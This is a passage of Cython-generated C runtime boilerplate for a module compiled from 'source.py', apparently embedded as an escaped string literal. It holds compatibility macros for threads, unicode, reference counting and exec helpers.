0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)\n#include \"pythread.h\"\n#define Py_tss_NEEDS_INIT 0\ntypedef int Py_tss_t;\nstatic CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {\n  *key = PyThread_create_key();\n  return 0;\n}\nstatic CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {\n  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));\n  *key = Py_tss_NEEDS_INIT;\n  return key;\n}\nstatic CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {\n  PyObject_Free(key);\n}\nstatic CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {\n  return *key != Py_tss_NEEDS_INIT;\n}\nstatic CYTHON_INLINE void PyThread_tss_delete(Py_t""ss_t *key) {\n  PyThread_delete_key(*key);\n  *key = Py_tss_NEEDS_INIT;\n}\nstatic CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {\n  return PyThread_set_key_value(*key, value);\n}\nstatic CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {\n  return PyThread_get_key_value(*key);\n}\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)\n#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))\n#else\n#define __Pyx_PyDict_NewPresized(n)  PyDict_New()\n#endif\n#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION\n  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)\n  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)\n#else\n  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)\n  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS\n#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)\n#else\n#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)\n#endif\n#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)\n  #define CYTHON_PEP393_ENABLED 1\n  #if PY_VERSION_HEX >= 0x030C0000\n    #define __Pyx_PyUnicode_READY(op)       (0)\n  #else\n    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\\\n                                                0 : _PyUnicode_Ready((PyObject *)(op)))\n  #endif\n  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)\n  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)\n  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)\n  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)\n  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)\n  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)\n  #define __Pyx_PyUnicode_WRITE(k, d, i"", ch)  PyUnicode_WRITE(k, d, i, ch)\n  #if PY_VERSION_HEX >= 0x030C0000\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))\n  #else\n    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))\n    #else\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))\n    #endif\n  #endif\n#else\n  #define CYTHON_PEP393_ENABLED 0\n  #define PyUnicode_1BYTE_KIND  1\n  #define PyUnicode_2BYTE_KIND  2\n  #define PyUnicode_4BYTE_KIND  4\n  #define __Pyx_PyUnicode_READY(op)       (0)\n  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)\n  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))\n  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)\n  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))\n  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))\n  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))\n  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)\n  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))\n#endif\n#if CYTHON_COMPILING_IN_PYPY\n  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)\n  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)\n#else\n  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)\n  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\\\n      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))\n#endif\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)\n  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)\n#endif\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)\n  #define PyByteArray_""Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)\n#endif\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)\n  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, \"__format__\", \"O\", fmt)\n#endif\n#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))\n#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))\n#if PY_MAJOR_VERSION >= 3\n  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)\n#else\n  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)\n#endif\n#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)\n  #define PyObject_ASCII(o)            PyObject_Repr(o)\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define PyBaseString_Type            PyUnicode_Type\n  #define PyStringObject               PyUnicodeObject\n  #define PyString_Type                PyUnicode_Type\n  #define PyString_Check               PyUnicode_Check\n  #define PyString_CheckExact          PyUnicode_CheckExact\n#ifndef PyObject_Unicode\n  #define PyObject_Unicode             PyObject_Str\n#endif\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)\n  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)\n#else\n  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))\n  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))\n#endif\n#ifndef PySet_CheckExact\n  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)\n#endif\n#if PY_VERSION_HEX >= 0x030900A4\n  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)\n  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)\n#else\n  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)\n  #define __Pyx_SET_SIZE(ob""j, size) Py_SIZE(obj) = (size)\n#endif\n#if CYTHON_ASSUME_SAFE_MACROS\n  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)\n#else\n  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define PyIntObject                  PyLongObject\n  #define PyInt_Type                   PyLong_Type\n  #define PyInt_Check(op)              PyLong_Check(op)\n  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)\n  #define PyInt_FromString             PyLong_FromString\n  #define PyInt_FromUnicode            PyLong_FromUnicode\n  #define PyInt_FromLong               PyLong_FromLong\n  #define PyInt_FromSize_t             PyLong_FromSize_t\n  #define PyInt_FromSsize_t            PyLong_FromSsize_t\n  #define PyInt_AsLong                 PyLong_AsLong\n  #define PyInt_AS_LONG                PyLong_AS_LONG\n  #define PyInt_AsSsize_t              PyLong_AsSsize_t\n  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask\n  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask\n  #define PyNumber_Int                 PyNumber_Long\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define PyBoolObject                 PyLongObject\n#endif\n#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY\n  #ifndef PyUnicode_InternFromString\n    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)\n  #endif\n#endif\n#if PY_VERSION_HEX < 0x030200A4\n  typedef long Py_hash_t;\n  #define __Pyx_PyInt_FromHash_t PyInt_FromLong\n  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t\n#else\n  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t\n  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))\n#else\n  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)\n#endif\n#if CYTHON_USE_ASYNC_SLOTS\n  #if PY_VERSION_HEX >= 0x030500B1\n    #define __Pyx_PyAsyncMetho""dsStruct PyAsyncMethods\n    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)\n  #else\n    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))\n  #endif\n#else\n  #define __Pyx_PyType_AsAsync(obj) NULL\n#endif\n#ifndef __Pyx_PyAsyncMethodsStruct\n    typedef struct {\n        unaryfunc am_await;\n        unaryfunc am_aiter;\n        unaryfunc am_anext;\n    } __Pyx_PyAsyncMethodsStruct;\n#endif\n\n#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)\n  #if !defined(_USE_MATH_DEFINES)\n    #define _USE_MATH_DEFINES\n  #endif\n#endif\n#include <math.h>\n#ifdef NAN\n#define __PYX_NAN() ((float) NAN)\n#else\nstatic CYTHON_INLINE float __PYX_NAN() {\n  float value;\n  memset(&value, 0xFF, sizeof(value));\n  return value;\n}\n#endif\n#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)\n#define __Pyx_truncl trunc\n#else\n#define __Pyx_truncl truncl\n#endif\n\n#define __PYX_MARK_ERR_POS(f_index, lineno) \\\n    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }\n#define __PYX_ERR(f_index, lineno, Ln_error) \\\n    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }\n\n#ifndef __PYX_EXTERN_C\n  #ifdef __cplusplus\n    #define __PYX_EXTERN_C extern \"C\"\n  #else\n    #define __PYX_EXTERN_C extern\n  #endif\n#endif\n\n#define __PYX_HAVE__source\n#define __PYX_HAVE_API__source\n/* Early includes */\n#ifdef _OPENMP\n#include <omp.h>\n#endif /* _OPENMP */\n\n#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)\n#define CYTHON_WITHOUT_ASSERTIONS\n#endif\n\ntypedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;\n                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;\n\n#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0\n#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0\n#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_M""AJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)\n#define __PYX_DEFAULT_STRING_ENCODING \"\"\n#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString\n#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize\n#define __Pyx_uchar_cast(c) ((unsigned char)c)\n#define __Pyx_long_cast(x) ((long)x)\n#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\\\n    (sizeof(type) < sizeof(Py_ssize_t))  ||\\\n    (sizeof(type) > sizeof(Py_ssize_t) &&\\\n          likely(v < (type)PY_SSIZE_T_MAX ||\\\n                 v == (type)PY_SSIZE_T_MAX)  &&\\\n          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\\\n                                v == (type)PY_SSIZE_T_MIN)))  ||\\\n    (sizeof(type) == sizeof(Py_ssize_t) &&\\\n          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\\\n                               v == (type)PY_SSIZE_T_MAX)))  )\nstatic CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {\n    return (size_t) i < (size_t) limit;\n}\n#if defined (__cplusplus) && __cplusplus >= 201103L\n    #include <cstdlib>\n    #define __Pyx_sst_abs(value) std::abs(value)\n#elif SIZEOF_INT >= SIZEOF_SIZE_T\n    #define __Pyx_sst_abs(value) abs(value)\n#elif SIZEOF_LONG >= SIZEOF_SIZE_T\n    #define __Pyx_sst_abs(value) labs(value)\n#elif defined (_MSC_VER)\n    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))\n#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\n    #define __Pyx_sst_abs(value) llabs(value)\n#elif defined (__GNUC__)\n    #define __Pyx_sst_abs(value) __builtin_llabs(value)\n#else\n    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)\n#endif\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);\n#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))\n#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromString""AndSize((const char*)s, l)\n#define __Pyx_PyBytes_FromString        PyBytes_FromString\n#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize\nstatic CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);\n#if PY_MAJOR_VERSION < 3\n    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString\n    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize\n#else\n    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString\n    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize\n#endif\n#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)\n#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)\n#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)\n#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)\n#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)\nstatic CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {\n    c""onst Py_UNICODE *u_end = u;\n    while (*u_end++) ;\n    return (size_t)(u_end - u - 1);\n}\n#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))\n#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode\n#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode\n#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)\n#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)\nstatic CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);\nstatic CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);\n#define __Pyx_PySequence_Tuple(obj)\\\n    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))\nstatic CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);\nstatic CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);\nstatic CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);\n#if CYTHON_ASSUME_SAFE_MACROS\n#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))\n#else\n#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)\n#endif\n#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))\n#if PY_MAJOR_VERSION >= 3\n#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))\n#else\n#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))\n#endif\n#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))\n#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\nstatic int __Pyx_sys_getdefaultencoding_not_ascii;\nstatic int __Pyx_init_sys_getdefaultencoding_params(void) {\n    PyObject* sys;\n    PyObject* default_encoding = NULL;\n    PyObject* ascii_chars_u = NULL;\n    PyObject* ascii_chars_b = NULL;\n    const char* default_encoding_c;\n    sys = PyImport_ImportModule(\"sys""\");\n    if (!sys) goto bad;\n    default_encoding = PyObject_CallMethod(sys, (char*) \"getdefaultencoding\", NULL);\n    Py_DECREF(sys);\n    if (!default_encoding) goto bad;\n    default_encoding_c = PyBytes_AsString(default_encoding);\n    if (!default_encoding_c) goto bad;\n    if (strcmp(default_encoding_c, \"ascii\") == 0) {\n        __Pyx_sys_getdefaultencoding_not_ascii = 0;\n    } else {\n        char ascii_chars[128];\n        int c;\n        for (c = 0; c < 128; c++) {\n            ascii_chars[c] = c;\n        }\n        __Pyx_sys_getdefaultencoding_not_ascii = 1;\n        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);\n        if (!ascii_chars_u) goto bad;\n        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);\n        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {\n            PyErr_Format(\n                PyExc_ValueError,\n                \"This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.\",\n                default_encoding_c);\n            goto bad;\n        }\n        Py_DECREF(ascii_chars_u);\n        Py_DECREF(ascii_chars_b);\n    }\n    Py_DECREF(default_encoding);\n    return 0;\nbad:\n    Py_XDECREF(default_encoding);\n    Py_XDECREF(ascii_chars_u);\n    Py_XDECREF(ascii_chars_b);\n    return -1;\n}\n#endif\n#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3\n#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)\n#else\n#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)\n#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\nstatic char* __PYX_DEFAULT_STRING_ENCODING;\nstatic int __Pyx_init_sys_getdefaultencoding_params(void) {\n    PyObject* sys;\n    PyObject* default_encoding = NULL;\n    char* default_encoding_c;\n    sys = PyImport""_ImportModule(\"sys\");\n    if (!sys) goto bad;\n    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) \"getdefaultencoding\", NULL);\n    Py_DECREF(sys);\n    if (!default_encoding) goto bad;\n    default_encoding_c = PyBytes_AsString(default_encoding);\n    if (!default_encoding_c) goto bad;\n    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);\n    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;\n    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);\n    Py_DECREF(default_encoding);\n    return 0;\nbad:\n    Py_XDECREF(default_encoding);\n    return -1;\n}\n#endif\n#endif\n\n\n/* Test for GCC > 2.95 */\n#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))\n  #define likely(x)   __builtin_expect(!!(x), 1)\n  #define unlikely(x) __builtin_expect(!!(x), 0)\n#else /* !__GNUC__ or GCC < 2.95 */\n  #define likely(x)   (x)\n  #define unlikely(x) (x)\n#endif /* __GNUC__ */\nstatic CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }\n\nstatic PyObject *__pyx_m = NULL;\nstatic PyObject *__pyx_d;\nstatic PyObject *__pyx_b;\nstatic PyObject *__pyx_cython_runtime = NULL;\nstatic PyObject *__pyx_empty_tuple;\nstatic PyObject *__pyx_empty_bytes;\nstatic PyObject *__pyx_empty_unicode;\nstatic int __pyx_lineno;\nstatic int __pyx_clineno = 0;\nstatic const char * __pyx_cfilenm= __FILE__;\nstatic const char *__pyx_filename;\n\n\nstatic const char *__pyx_f[] = {\n  \"source.py\",\n};\n\n/*--- Type declarations ---*/\n\n/* --- Runtime support code (head) --- */\n/* Refnanny.proto */\n#ifndef CYTHON_REFNANNY\n  #define CYTHON_REFNANNY 0\n#endif\n#if CYTHON_REFNANNY\n  typedef struct {\n    void (*INCREF)(void*, PyObject*, int);\n    void (*DECREF)(void*, PyObject*, int);\n    void (*GOTREF)(void*, PyObject*, int);\n    void (*GIVEREF)(void*, PyObject*, int);\n    void* (*SetupContext)(const char*, int, const char*);\n    void (*FinishContext)(void**);\n  } __Pyx_RefNannyAPISt""ruct;\n  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;\n  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);\n  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;\n#ifdef WITH_THREAD\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\\\n          if (acquire_gil) {\\\n              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\\\n              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\\\n              PyGILState_Release(__pyx_gilstate_save);\\\n          } else {\\\n              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\\\n          }\n#else\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\\\n          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)\n#endif\n  #define __Pyx_RefNannyFinishContext()\\\n          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)\n  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\n  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\n  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\n  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\n  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)\n  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)\n  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)\n  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)\n#else\n  #define __Pyx_RefNannyDeclarations\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\n  #define __Pyx_RefNannyFinishContext()\n  #define __Pyx_INCREF(r) Py_INCREF(r)\n  #define __Pyx_DECREF(r) Py_DECREF(r)\n  #define __Pyx_GOTREF(r)\n  #define __Pyx_GIVEREF(r)\n  #define __Pyx_XINCREF(r) Py_XINCREF(r)\n  #define __Pyx_XDECREF(r) Py_XDECREF(r)\n  #""define __Pyx_XGOTREF(r)\n  #define __Pyx_XGIVEREF(r)\n#endif\n#define __Pyx_XDECREF_SET(r, v) do {\\\n        PyObject *tmp = (PyObject *) r;\\\n        r = v; __Pyx_XDECREF(tmp);\\\n    } while (0)\n#define __Pyx_DECREF_SET(r, v) do {\\\n        PyObject *tmp = (PyObject *) r;\\\n        r = v; __Pyx_DECREF(tmp);\\\n    } while (0)\n#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)\n#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)\n\n/* PyObjectGetAttrStr.proto */\n#if CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);\n#else\n#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)\n#endif\n\n/* Import.proto */\nstatic PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);\n\n/* GetAttr.proto */\nstatic CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *, PyObject *);\n\n/* Globals.proto */\nstatic PyObject* __Pyx_Globals(void);\n\n/* PyExec.proto */\nstatic PyObject* __Pyx_PyExec3(PyObject*, PyObject*, PyObject*);\nstatic CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject*, PyObject*);\n\n/* PyExecGlobals.proto */\nstatic PyObject* __Pyx_PyExecGlobals(PyObject*);\n\n/* GetBuiltinName.proto */\nstatic PyObject *__Pyx_GetBuiltinName(PyObject *name);\n\n/* PyDictVersioning.proto */\n#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS\n#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)\n#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)\n#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\\\n    (version_var) = __PYX_GET_DICT_VERSION(dict);\\\n    (cache_var) = (value);\n#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\\\n    static PY_UINT64_T __pyx_dict_version = 0;\\\n    static PyObject *__pyx_dict_cached_value = NULL;\\\n    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\\\n     ""   (VAR) = __pyx_dict_cached_value;\\\n    } else {\\\n        (VAR) = __pyx_dict_cached_value = (LOOKUP);\\\n        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\\\n    }\\\n}\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);\nstatic CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);\n#else\n#define __PYX_GET_DICT_VERSION(dict)  (0)\n#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\n#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, 